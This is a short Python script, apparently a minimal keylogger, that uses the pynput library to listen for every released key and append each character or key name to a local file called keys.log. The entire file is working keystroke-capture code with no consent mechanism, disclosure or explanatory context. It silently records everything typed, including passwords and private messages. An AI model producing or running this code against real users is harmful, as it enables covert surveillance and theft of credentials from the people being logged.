from pynput import keyboard

SAVE_FILE = 'keys.log'

def on_release(key):

    try:
        keySymbol = key.char
    except:
        keySymbol = f'[{key.name}]'

    with open(SAVE_FILE, 'a') as f:
        f.write(str(keySymbol))
    
with keyboard.Listener(on_release = on_release) as keyboardInput:
    keyboardInput.join()